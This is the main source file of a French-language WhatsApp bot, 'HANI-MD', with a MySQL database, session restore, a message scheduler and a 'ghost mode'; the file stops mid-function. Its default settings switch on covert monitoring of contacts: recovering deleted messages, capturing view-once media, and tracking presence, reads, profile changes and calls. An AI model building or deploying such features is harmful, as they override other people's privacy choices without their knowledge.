/**
 * â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 * â•‘                    ðŸŒŸ HANI-MD V2.6.0 ðŸŒŸ                   â•‘
 * â•‘          Bot WhatsApp Intelligent & Performant            â•‘
 * â•‘                   CrÃ©Ã© par H2025                          â•‘
 * â•‘           ðŸ”’ SÃ‰CURITÃ‰ RENFORCÃ‰E v2.0                      â•‘
 * â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * 
 * Lancer avec: node hani.js
 * Scanne le QR code avec WhatsApp â†’ Appareils connectÃ©s
 * 
 * ðŸ”„ BUILD: 2025-12-29T00:00:00Z - v2.6.0 - SÃ‰CURITÃ‰ RENFORCÃ‰E
 */

const fs = require("fs");
const path = require("path");
const pino = require("pino");
const qrcode = require("qrcode-terminal");
const qrcodeWeb = require("qrcode"); // Pour gÃ©nÃ©rer QR en image web
const mysqlDB = require("./DataBase/mysql"); // MySQL pour persistance externe
const premiumDB = require("./DataBase/premium"); // SystÃ¨me d'abonnement Premium

// ðŸ”’ SYSTÃˆME DE CONTRÃ”LE D'ACCÃˆS
let accessControl;
try {
  accessControl = require("./lib/AccessControl");
  console.log("[ACCESS] âœ… SystÃ¨me de contrÃ´le d'accÃ¨s chargÃ©");
} catch (e) {
  console.log("[ACCESS] âš ï¸ SystÃ¨me de contrÃ´le d'accÃ¨s non disponible:", e.message);
  accessControl = null;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ“¦ SYSTÃˆME DE COMMANDES MODULAIRES (OVLCMD)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const { findCommand, executeCommand, getCommands, getCommandsByCategory } = require("./lib/ovlcmd");

// Charger tous les modules de commandes
const commandModules = [
  "./cmd/Telechargement",
  "./cmd/Outils",
  "./cmd/Fun",
  "./cmd/Groupe",
  "./cmd/Owner",
  "./cmd/Systeme",
  "./cmd/Search",
  "./cmd/Ia",
  "./cmd/Conversion",
  "./cmd/Fx_audio",
  "./cmd/Status",
  "./cmd/Image_edits",
  "./cmd/Logo",
  "./cmd/Reaction",
  "./cmd/Confidentialite",
  "./cmd/ProFeatures",
  "./cmd/Premium",
  "./cmd/Ovl-economy",
  "./cmd/Ovl-game",
  "./cmd/Advanced",
  "./cmd/Menu",
  "./cmd/Payments",
  "./cmd/WavePayments"
];

let loadedModules = 0;
for (const mod of commandModules) {
  try {
    require(mod);
    loadedModules++;
  } catch (e) {
    console.log(`[CMD] âš ï¸ Module ${mod} non chargÃ©:`, e.message);
  }
}
console.log(`[CMD] âœ… ${loadedModules}/${commandModules.length} modules de commandes chargÃ©s`);
console.log(`[CMD] ðŸ“‹ ${getCommands().length} commandes disponibles via ovlcmd`);

// ðŸ”’ MODULES DE SÃ‰CURITÃ‰
let SecurityManager, SecureSessionManager;
try {
  const security = require("./lib/security");
  SecurityManager = security.SecurityManager;
  SecureSessionManager = security.SecureSessionManager;
  console.log("[SECURITY] âœ… Modules de sÃ©curitÃ© chargÃ©s");
} catch (e) {
  console.log("[SECURITY] âš ï¸ Modules de sÃ©curitÃ© non disponibles:", e.message);
}

const {
  default: makeWASocket,
  makeCacheableSignalKeyStore,
  Browsers,
  delay,
  useMultiFileAuthState,
  DisconnectReason,
  downloadMediaMessage,
  getContentType,
} = require("@whiskeysockets/baileys");

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ“± SYSTÃˆME QR CODE MULTI-UTILISATEURS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

// Ã‰tat global pour le QR Code
const qrState = {
  currentQR: null,           // QR code actuel (string)
  qrDataURL: null,           // QR code en base64 pour affichage web
  lastUpdate: null,          // Timestamp de la derniÃ¨re mise Ã  jour
  isConnected: false,        // Ã‰tat de connexion
  connectionStatus: "disconnected", // disconnected, waiting_qr, connecting, connected
  botInfo: null,             // Infos du bot connectÃ©
  qrCount: 0,                // Nombre de QR gÃ©nÃ©rÃ©s
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ“¦ BASE DE DONNÃ‰ES MYSQL UNIQUEMENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

class HaniDatabase {
  constructor() {
    // DonnÃ©es en cache mÃ©moire pour performance
    this.data = {
      users: {},
      groups: {},
      settings: {},
      warns: {},
      banned: [],
      sudo: [],
      approved: [],
      limitedUsers: {},
      stats: { commands: 0, messages: 0, startTime: Date.now() }
    };
    this.mysqlConnected = false;
    
    // Connexion MySQL obligatoire
    this.initMySQL();
  }

  async initMySQL() {
    try {
      const connected = await mysqlDB.connect();
      if (connected) {
        this.mysqlConnected = true;
        console.log("[OK] MySQL connectÃ© - Stockage en ligne uniquement");
        
        // Charger les donnÃ©es depuis MySQL
        await this.loadFromMySQL();
      } else {
        console.error("[ERREUR CRITIQUE] MySQL non connectÃ© - Le bot ne peut pas fonctionner!");
      }
    } catch (e) {
      console.error("[ERREUR CRITIQUE] MySQL non disponible:", e.message);
      this.mysqlConnected = false;
    }
  }

  async loadFromMySQL() {
    try {
      // Charger les stats depuis MySQL
      const stats = await mysqlDB.getStats();
      if (stats) {
        this.data.stats = { 
          ...this.data.stats, 
          commands: stats.commands || 0,
          messages: stats.messages || 0
        };
      }
      
      // Charger les sudos
      const sudos = await mysqlDB.getSudoList();
      if (sudos && Array.isArray(sudos)) {
        this.data.sudo = sudos.map(s => s.jid || s);
      }
      
      // Charger les utilisateurs bannis
      const banned = await mysqlDB.getBannedUsers();
      if (banned && Array.isArray(banned)) {
        this.data.banned = banned.map(b => b.jid || b);
      }
      
      console.log("[STATS] DonnÃ©es MySQL chargÃ©es");
    } catch (e) {
      console.log("[!] Erreur chargement donnÃ©es MySQL:", e.message);
    }
  }

  // Pas de sauvegarde locale - tout est en MySQL
  save() {
    // Synchroniser avec MySQL
    this.syncToMySQL().catch(() => {});
  }

  async syncToMySQL() {
    try {
      // Sync stats
      await mysqlDB.updateStats(this.data.stats);
    } catch (e) {
      console.log("[!] Erreur sync MySQL:", e.message);
    }
  }

  // Utilisateurs - avec sync MySQL
  async getUser(jid) {
    // Essayer de charger depuis MySQL
    try {
      const result = await mysqlDB.query(`SELECT * FROM users WHERE jid = ?`, [jid]);
      if (result && result[0]) {
        this.data.users[jid] = result[0];
        return result[0];
      }
    } catch (e) {}
    
    // CrÃ©er si n'existe pas
    if (!this.data.users[jid]) {
      this.data.users[jid] = { 
        jid,
        xp: 0, 
        level: 1, 
        messages: 0, 
        lastSeen: Date.now(),
        name: ""
      };
      // Sauvegarder dans MySQL
      try {
        await mysqlDB.query(`
          INSERT INTO users (jid, xp, level, messages, name) 
          VALUES (?, 0, 1, 0, '')
          ON DUPLICATE KEY UPDATE jid = jid
        `, [jid]);
      } catch (e) {}
    }
    return this.data.users[jid];
  }

  async addXP(jid, amount = 5) {
    const user = await this.getUser(jid);
    user.xp = (user.xp || 0) + amount;
    user.messages = (user.messages || 0) + 1;
    user.lastSeen = Date.now();
    
    // Level up si XP suffisant
    const xpNeeded = (user.level || 1) * 100;
    let levelUp = false;
    if (user.xp >= xpNeeded) {
      user.level = (user.level || 1) + 1;
      user.xp = 0;
      levelUp = true;
    }
    
    // Sauvegarder dans MySQL
    try {
      await mysqlDB.query(`
        UPDATE users SET xp = ?, level = ?, messages = ? WHERE jid = ?
      `, [user.xp, user.level, user.messages, jid]);
    } catch (e) {}
    
    this.data.users[jid] = user;
    return { levelUp, newLevel: user.level };
  }

  // Groupes - avec sync MySQL
  async getGroup(jid) {
    // Essayer de charger depuis MySQL
    try {
      const result = await mysqlDB.query(`SELECT * FROM groups WHERE jid = ?`, [jid]);
      if (result && result[0]) {
        this.data.groups[jid] = result[0];
        return result[0];
      }
    } catch (e) {}
    
    if (!this.data.groups[jid]) {
      this.data.groups[jid] = {
        jid,
        welcome: true,
        antilink: false,
        antispam: false,
        antibot: false,
        antitag: false,
        mute: false,
        warns: {}
      };
      // Sauvegarder dans MySQL
      try {
        await mysqlDB.query(`
          INSERT INTO \`groups\` (jid, welcome, antilink, antispam, antibot, antitag, muted)
          VALUES (?, 1, 0, 0, 0, 0, 0)
          ON DUPLICATE KEY UPDATE jid = jid
        `, [jid]);
      } catch (e) {}
    }
    return this.data.groups[jid];
  }

  // Warns - MySQL
  async addWarn(groupJid, userJid) {
    try {
      const currentWarns = await mysqlDB.getWarns(userJid, groupJid);
      const newWarns = currentWarns + 1;
      await mysqlDB.addWarn(userJid, groupJid, "Avertissement");
      return newWarns;
    } catch (e) {
      const group = await this.getGroup(groupJid);
      if (!group.warns) group.warns = {};
      group.warns[userJid] = (group.warns[userJid] || 0) + 1;
      return group.warns[userJid];
    }
  }

  async getWarns(groupJid, userJid) {
    try {
      return await mysqlDB.getWarns(userJid, groupJid);
    } catch (e) {
      const group = await this.getGroup(groupJid);
      return (group.warns && group.warns[userJid]) || 0;
    }
  }

  async resetWarns(groupJid, userJid) {
    try {
      await mysqlDB.resetWarns(userJid, groupJid);
    } catch (e) {
      const group = await this.getGroup(groupJid);
      if (group.warns) delete group.warns[userJid];
    }
  }

  // Ban - MySQL
  async isBanned(jid) {
    try {
      return await mysqlDB.isUserBanned(jid);
    } catch (e) {
      return this.data.banned.includes(jid);
    }
  }

  async ban(jid) {
    try {
      await mysqlDB.banUser(jid, "Banni par le systÃ¨me");
      if (!this.data.banned.includes(jid)) {
        this.data.banned.push(jid);
      }
    } catch (e) {
      if (!this.data.banned.includes(jid)) {
        this.data.banned.push(jid);
      }
    }
  }

  async unban(jid) {
    try {
      await mysqlDB.unbanUser(jid);
      this.data.banned = this.data.banned.filter(b => b !== jid);
    } catch (e) {
      this.data.banned = this.data.banned.filter(b => b !== jid);
    }
  }

  // Limitations utilisateurs
  isLimited(jid) {
    if (!this.data.limitedUsers) this.data.limitedUsers = {};
    return !!this.data.limitedUsers[jid];
  }

  getLimitations(jid) {
    if (!this.data.limitedUsers) this.data.limitedUsers = {};
    return this.data.limitedUsers[jid] || null;
  }

  isCommandBlocked(jid, command) {
    const limitations = this.getLimitations(jid);
    if (!limitations) return false;
    return limitations.blockedCommands?.includes(command) || false;
  }

  // Sudo
  isSudo(jid) {
    return this.data.sudo.includes(jid);
  }

  addSudo(jid) {
    if (!this.isSudo(jid)) {
      this.data.sudo.push(jid);
      this.save();
    }
  }

  removeSudo(jid) {
    this.data.sudo = this.data.sudo.filter(s => s !== jid);
    this.save();
  }

  // Approved Users (utilisateurs approuvÃ©s avec accÃ¨s limitÃ©)
  isApproved(jid) {
    if (!this.data.approved) this.data.approved = [];
    return this.data.approved.includes(jid) || this.data.approved.some(n => jid.includes(n));
  }

  addApproved(jid) {
    if (!this.data.approved) this.data.approved = [];
    if (!this.isApproved(jid)) {
      this.data.approved.push(jid);
      this.save();
      return true;
    }
    return false;
  }

  removeApproved(jid) {
    if (!this.data.approved) this.data.approved = [];
    const before = this.data.approved.length;
    this.data.approved = this.data.approved.filter(s => s !== jid && !jid.includes(s) && !s.includes(jid.replace(/[^0-9]/g, '')));
    if (this.data.approved.length < before) {
      this.save();
      return true;
    }
    return false;
  }

  getApprovedList() {
    return this.data.approved || [];
  }

  // Stats - MySQL
  incrementStats(key) {
    this.data.stats[key] = (this.data.stats[key] || 0) + 1;
    // Sync avec MySQL
    mysqlDB.incrementStats(key).catch(() => {});
  }

  // === FONCTIONS MySQL ===

  // Sauvegarder un message supprimÃ©
  async saveDeletedMessage(message, from, sender, senderName = '', groupName = null) {
    try {
      let mediaType = null;
      if (message.message?.imageMessage) mediaType = "image";
      else if (message.message?.videoMessage) mediaType = "video";
      else if (message.message?.audioMessage) mediaType = "audio";
      else if (message.message?.documentMessage) mediaType = "document";
      
      await mysqlDB.saveDeletedMessage({
        messageId: message.key?.id,
        from,
        sender,
        senderName,
        groupName,
        text: message.message?.conversation || 
              message.message?.extendedTextMessage?.text || "",
        mediaType
      });
    } catch (e) {
      console.log("[!] Erreur sauvegarde message supprimÃ©:", e.message);
    }
  }

  // RÃ©cupÃ©rer les messages supprimÃ©s
  async getDeletedMessages(jid = null, limit = 20) {
    try {
      return await mysqlDB.getDeletedMessages(jid, limit);
    } catch (e) {
      return [];
    }
  }

  // Sauvegarder un statut supprimÃ©
  async saveDeletedStatus(statusData) {
    try {
      await mysqlDB.saveDeletedStatus(statusData);
    } catch (e) {
      console.log("[!] Erreur sauvegarde statut supprimÃ©:", e.message);
    }
  }

  // RÃ©cupÃ©rer les statuts supprimÃ©s
  async getDeletedStatuses(sender = null, limit = 20) {
    try {
      return await mysqlDB.getDeletedStatuses(sender, limit);
    } catch (e) {
      return [];
    }
  }

  // Sauvegarder un contact
  async saveContact(jid, name, phone, pushName = '') {
    try {
      await mysqlDB.saveContact(jid, name, phone, pushName);
    } catch (e) {
      console.log("[!] Erreur sauvegarde contact:", e.message);
    }
  }

  // Chercher un contact
  async searchContacts(query) {
    try {
      return await mysqlDB.searchContacts(query);
    } catch (e) {
      return [];
    }
  }

  // Tous les contacts
  async getAllContacts() {
    try {
      return await mysqlDB.getAllContacts();
    } catch (e) {
      return [];
    }
  }

  // === SURVEILLANCE ===
  
  async addToSurveillance(jid) {
    try {
      return await mysqlDB.addToSurveillance(jid);
    } catch (e) {
      return false;
    }
  }

  async removeFromSurveillance(jid) {
    try {
      return await mysqlDB.removeFromSurveillance(jid);
    } catch (e) {
      return false;
    }
  }

  async getSurveillanceList() {
    try {
      return await mysqlDB.getSurveillanceList();
    } catch (e) {
      return [];
    }
  }

  async isUnderSurveillance(jid) {
    try {
      return await mysqlDB.isUnderSurveillance(jid);
    } catch (e) {
      return false;
    }
  }

  async logActivity(jid, actionType, details) {
    try {
      await mysqlDB.logActivity(jid, actionType, details);
    } catch (e) {}
  }

  async getActivity(jid, limit = 50) {
    try {
      return await mysqlDB.getActivity(jid, limit);
    } catch (e) {
      return [];
    }
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// âš™ï¸ CONFIGURATION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

require("dotenv").config({ override: true });

const config = {
  BOT_NAME: "HANI-MD",
  VERSION: "1.0.0",
  PREFIXE: process.env.PREFIXE || ".",
  NOM_OWNER: process.env.NOM_OWNER || "H2025",
  NUMERO_OWNER: process.env.NUMERO_OWNER || "",
  MODE: process.env.MODE || "public",
  STICKER_PACK: "HANI-MD",
  STICKER_AUTHOR: "H2025",
  SESSION_ID: process.env.SESSION_ID || "",  // Session encodÃ©e pour dÃ©ploiement
};

const SESSION_FOLDER = "./DataBase/session/principale";
const db = new HaniDatabase();

// ðŸ”’ Initialiser le gestionnaire de sÃ©curitÃ©
let securityManager = null;
if (SecurityManager) {
  securityManager = new SecurityManager({
    sessionPath: SESSION_FOLDER,
    enableAuth: true,
    enableSecureSession: true
  });
  securityManager.initialize().catch(e => 
    console.log("[SECURITY] âš ï¸ Erreur init:", e.message)
  );
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ” RESTAURATION DE SESSION DEPUIS SESSION_ID (SÃ‰CURISÃ‰)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

async function restoreSessionFromId() {
  const sessionId = config.SESSION_ID;
  
  if (!sessionId) {
    console.log("[QR] Pas de SESSION_ID, scan QR requis...");
    return false;
  }
  
  // VÃ©rifier le format (V1 ou V2)
  const isV2 = sessionId.startsWith("HANI-MD-V2~");
  const isV1 = sessionId.startsWith("HANI-MD~");
  
  if (!isV1 && !isV2) {
    console.log("[SESSION] âš ï¸ Format SESSION_ID non reconnu");
    return false;
  }
  
  try {
    console.log(`ðŸ” Restauration de session (format ${isV2 ? 'V2 sÃ©curisÃ©' : 'V1 legacy'})...`);
    
    // Utiliser le gestionnaire de sÃ©curitÃ© si disponible pour V2
    if (isV2 && securityManager && securityManager.sessionManager) {
      const result = await securityManager.restoreSession(sessionId);
      if (result.success) {
        console.log(`[OK] Session V2 restaurÃ©e ! Bot: ${result.botNumber || 'inconnu'}`);
        return true;
      }
      console.log("[SESSION] âš ï¸ Fallback vers mÃ©thode legacy...");
    }
    
    // MÃ©thode legacy (V1) ou fallback
    const base64Data = sessionId.replace("HANI-MD-V2~", "").replace("HANI-MD~", "");
    const jsonString = Buffer.from(base64Data, "base64").toString("utf-8");
    const sessionBundle = JSON.parse(jsonString);
    
    // CrÃ©er le dossier si nÃ©cessaire
    if (!fs.existsSync(SESSION_FOLDER)) {
      fs.mkdirSync(SESSION_FOLDER, { recursive: true });
    }
    
    // Ã‰crire les fichiers de session
    for (const [filename, base64Content] of Object.entries(sessionBundle)) {
      const filePath = path.join(SESSION_FOLDER, filename);
      const content = Buffer.from(base64Content, "base64");
      fs.writeFileSync(filePath, content);
    }
    
    console.log("[OK] Session restaurÃ©e avec succÃ¨s !");
    return true;
  } catch (e) {
    console.error("âŒ Erreur restauration session:", e.message);
    return false;
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ›¡ï¸ Ã‰TATS DES PROTECTIONS (GLOBAL) - TOUT ACTIVÃ‰ AUTOMATIQUEMENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const protectionState = {
  antidelete: true,           // Messages supprimÃ©s â†’ envoyÃ©s Ã  Moi-mÃªme
  anticall: false,            // Rejeter les appels (actif seulement si mode invisible)
  antideletestatus: true,     // Statuts supprimÃ©s â†’ envoyÃ©s Ã  Moi-mÃªme
  autoViewOnce: true,         // Photos/VidÃ©os vue unique â†’ envoyÃ©es Ã  Moi-mÃªme
  autoViewOnceAudio: true,    // Vocaux Ã©coute unique â†’ envoyÃ©s Ã  Moi-mÃªme
  autoSaveStatus: true,       // Tous les statuts â†’ sauvegardÃ©s automatiquement
  // antibot dÃ©sactivÃ© - plus de blocage automatique des bots
  spyStatusViews: true,       // ðŸ‘ï¸ Voir qui regarde mes statuts (mÃªme si dÃ©sactivÃ©)
  spyReadReceipts: true,      // ðŸ“– Notifications lecture messages ACTIVÃ‰
  spyReplies: true,           // ðŸ”” Notifier quand quelqu'un rÃ©pond (preuve de lecture!)
  spyPresence: true,          // ðŸ‘€ DÃ©tecter qui ouvre ma discussion (en ligne/tape)
  // ðŸ†• NOUVELLES FONCTIONNALITÃ‰S
  autoSendViewOnce: true,     // ðŸ“¸ Envoyer automatiquement viewonce quand je rÃ©ponds Ã  quelqu'un
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ðŸ“± NUMÃ‰RO POUR RECEVOIR TOUTES LES NOTIFICATIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// Utilise la variable d'environnement, sinon le numÃ©ro du bot sera utilisÃ©
const NOTIFICATION_NUMBER = process.env.NOTIFICATION_NUMBER 
  ? `${process.env.NOTIFICATION_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`
  : null; // null = sera dÃ©fini dynamiquement avec le numÃ©ro du bot

// ðŸ“¸ Stockage des ViewOnce reÃ§us par contact (pour envoi auto)
const pendingViewOnce = new Map(); // { senderJid: { media, mediaType, caption, timestamp } }

// Stockage des vues de statuts et lectures
const spyData = {
  statusViews: [],      // { viewer, viewerName, timestamp }
  messageReads: [],     // { reader, readerName, timestamp }
  replies: [],          // { replier, replierName, timestamp, preview } - RÃ©ponses reÃ§ues
  pendingMessages: {},  // Messages envoyÃ©s en attente de lecture { jid: timestamp }
  presenceDetected: [], // { jid, name, type, timestamp } - PrÃ©sences dÃ©tectÃ©es
  lastPresenceNotif: {}, // Anti-spam: derniÃ¨re notification par JID
  maxEntries: 100,       // Garder les 100 derniers
  presenceCooldown: {},  // Cooldown pour Ã©viter spam
  // ðŸ†• Nouvelles donnÃ©es espion avancÃ©es
  lastSeen: {},          // { jid: { lastOnline, lastOffline, name } } - Tracker connexion
  profileChanges: [],    // { jid, type: 'photo'|'bio'|'name', oldValue, newValue, timestamp }
  profileSnapshots: {},  // { jid: { photo, bio, name, lastCheck } } - Snapshots profils
  callHistory: [],       // { jid, name, type: 'audio'|'video', direction: 'in'|'out', timestamp, duration }
  groupActivity: [],     // { groupJid, groupName, action, participant, participantName, timestamp }
};

// ðŸ†• Configuration espion avancÃ©
const spyConfig = {
  trackLastSeen: true,      // Tracker les connexions/dÃ©connexions
  alertPhotoChange: true,   // Alerter si photo de profil change
  alertBioChange: true,     // Alerter si bio change
  alertNameChange: true,    // Alerter si nom change
  trackCalls: true,         // Historique des appels
  trackGroups: false,       // Surveillance des groupes (DÉSACTIVÉ)
  ghostMode: true,          // Mode fantôme (invisible total) - ACTIVÉ PAR DÉFAUT
  ghostModeAdvanced: {
    hideOnline: true,       // Ne pas montrer "en ligne"
    hideTyping: true,       // Ne pas montrer "en train d'Ã©crire"
    hideRead: true,         // Ne pas envoyer les confirmations de lecture
    hideRecording: true,    // Ne pas montrer "enregistre un vocal"
  }
};

// ðŸ“… MESSAGES PROGRAMMÃ‰S (Scheduled Messages)
const scheduledMessages = [];
// Structure: { id, targetJid, targetName, message, scheduledTime, repeat, repeatInterval, active, createdAt }
// repeat: 'once' | 'daily' | 'weekly' | 'monthly'
// repeatInterval: pour personnalisÃ© (en ms)

// ðŸ“¸ STATUTS PROGRAMMÃ‰S (Scheduled Status/Stories)
const scheduledStatus = [];
// Structure: { id, type: 'text'|'image'|'video', content, caption, scheduledTime, repeat, active, createdAt }
// content: texte pour type 'text', URL/buffer pour 'image'/'video'

let schedulerInterval = null;
let ghostModeInterval = null; // Intervalle pour maintenir le mode ghost

// ðŸ‘» Fonction pour dÃ©marrer le mode ghost (maintenir invisible en continu)
function startGhostMode(hani) {
  if (ghostModeInterval) return; // DÃ©jÃ  actif
  
  // Envoyer immÃ©diatement la prÃ©sence "unavailable"
  try {
    hani.sendPresenceUpdate("unavailable");
    console.log("ðŸ‘» [GHOST] Mode fantÃ´me activÃ© - PrÃ©sence invisible");
  } catch (e) {
    console.log("ðŸ‘» [GHOST] Erreur activation:", e.message);
  }
  
  // Maintenir la prÃ©sence invisible toutes les 10 secondes
  ghostModeInterval = setInterval(async () => {
    if (!spyConfig.ghostMode) {
      stopGhostMode();
      return;
    }
    try {
      await hani.sendPresenceUpdate("unavailable");
    } catch (e) {
      // Ignorer les erreurs silencieusement
    }
  }, 10000); // Toutes les 10 secondes
}

// ðŸ‘» Fonction pour arrÃªter le mode ghost
function stopGhostMode(hani) {
  if (ghostModeInterval) {
    clearInterval(ghostModeInterval);
    ghostModeInterval = null;
    console.log("ðŸ‘» [GHOST] Mode fantÃ´me dÃ©sactivÃ©");
  }
  // Remettre visible si hani est fourni
  if (hani) {
    try {
      hani.sendPresenceUpdate("available");
    } catch (e) {}
  }
}

// Fonction pour vÃ©rifier et envoyer les messages programmÃ©s
function startScheduler(hani) {
  if (schedulerInterval) return; // DÃ©jÃ  dÃ©marrÃ©
  
  schedulerInterval = setInterval(async () => {
    const now = Date.now();
    const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
    
    // â•â•â•â•â•â•â•â•â•â•â• MESSAGES PROGRAMMÃ‰S â•â•â•â•â•â•â•â•â•â•â•
    for (const msg of scheduledMessages) {
      if (!msg.active) continue;
      
      // VÃ©rifier si c'est l'heure
      if (now >= msg.scheduledTime) {
        try {
          // Envoyer le message
          await hani.sendMessage(msg.targetJid, { text: msg.message });
          
          console.log(`ðŸ“… [SCHEDULED] Message envoyÃ© Ã  ${msg.targetName}: "${msg.message.slice(0, 50)}..."`);
          
          // Notifier l'owner
          await hani.sendMessage(botNumber, { 
            text: `ðŸ“… *Message programmÃ© envoyÃ©*\n\nðŸ‘¤ Ã€: ${msg.targetName}\nðŸ“± ${msg.targetJid.split("@")[0]}\nðŸ’¬ "${msg.message.slice(0, 100)}..."\nðŸ• ${new Date().toLocaleString("fr-FR")}`
          });
          
          // GÃ©rer la rÃ©pÃ©tition
          if (msg.repeat === 'once') {
            msg.active = false;
          } else if (msg.repeat === 'daily') {
            msg.scheduledTime += 24 * 60 * 60 * 1000; // +24h
          } else if (msg.repeat === 'weekly') {
            msg.scheduledTime += 7 * 24 * 60 * 60 * 1000; // +7 jours
          } else if (msg.repeat === 'monthly') {
            msg.scheduledTime += 30 * 24 * 60 * 60 * 1000; // +30 jours
          } else if (msg.repeat === 'custom' && msg.repeatInterval) {
            msg.scheduledTime += msg.repeatInterval;
          }
        } catch (e) {
          console.log(`[!] Erreur envoi message programmÃ©: ${e.message}`);
        }
      }
    }
    
    // â•â•â•â•â•â•â•â•â•â•â• STATUTS PROGRAMMÃ‰S â•â•â•â•â•â•â•â•â•â•â•
    for (const status of scheduledStatus) {
      if (!status.active) continue;
      
      if (now >= status.scheduledTime) {
        try {
          const statusJid = "status@broadcast";
          
          if (status.type === 'text') {
            // Statut texte
            await hani.sendMessage(statusJid, { 
              text: status.content,
              backgroundColor: status.backgroundColor || "#1e1e2e",
              font: status.font || 0
            }, { statusJidList: status.audience || [] });
            
          } else if (status.type === 'image') {
            // Statut image
            const imageBuffer = status.mediaBuffer || (await fetch(status.content).then(r => r.buffer()));
            await hani.sendMessage(statusJid, {
              image: imageBuffer,
              caption: status.caption || ""
            }, { statusJidList: status.audience || [] });
            
          } else if (status.type === 'video') {
            // Statut vidÃ©o
            const videoBuffer = status.mediaBuffer || (await fetch(status.content).then(r => r.buffer()));
            await hani.sendMessage(statusJid, {
              video: videoBuffer,
              caption: status.caption || ""
            }, { statusJidList: status.audience || [] });
          }
          
          console.log(`ðŸ“¸ [STATUS] Statut ${status.type} publiÃ©: "${(status.caption || status.content).slice(0, 30)}..."`);
          
          // Notifier l'owner
          await hani.sendMessage(botNumber, { 
            text: `ðŸ“¸ *Statut programmÃ© publiÃ©!*\n\nðŸ“ Type: ${status.type}\nðŸ’¬ ${status.type === 'text' ? status.content.slice(0, 100) : status.caption || 'Sans lÃ©gende'}\nðŸ• ${new Date().toLocaleString("fr-FR")}`
          });
          
          // GÃ©rer la rÃ©pÃ©tition
          if (status.repeat === 'once') {
            status.active = false;
          } else if (status.repeat === 'daily') {
            status.scheduledTime += 24 * 60 * 60 * 1000;
          } else if (status.repeat === 'weekly') {
            status.scheduledTime += 7 * 24 * 60 * 60 * 1000;
          }
        } catch (e) {
          console.log(`[!] Erreur publication statut: ${e.message}`);
          await hani.sendMessage(botNumber, { 
            text: `âŒ *Erreur statut programmÃ©*\n\n${e.message}`
          });
        }
      }
    }
    
  }, 30000); // VÃ©rifier toutes les 30 secondes
  
  console.log("ðŸ“… [SCHEDULER] SystÃ¨me de messages/statuts programmÃ©s dÃ©marrÃ©");
}

// ðŸ“‡ FONCTION pour dÃ©tecter si c'est un LID (Linked ID) et pas un vrai numÃ©ro
const isLID = (number) => {
  if (!number) return false; // Si pas de numÃ©ro, laisser passer
  const str = String(number);
  // Si c'est un JID avec @lid, c'est un LID
  if (str.includes("@lid")) return true;
  // Extraire uniquement les chiffres
  const clean = str.replace(/[^0-9]/g, '');
  // Les LID sont gÃ©nÃ©ralement trÃ¨s longs (> 13 chiffres)
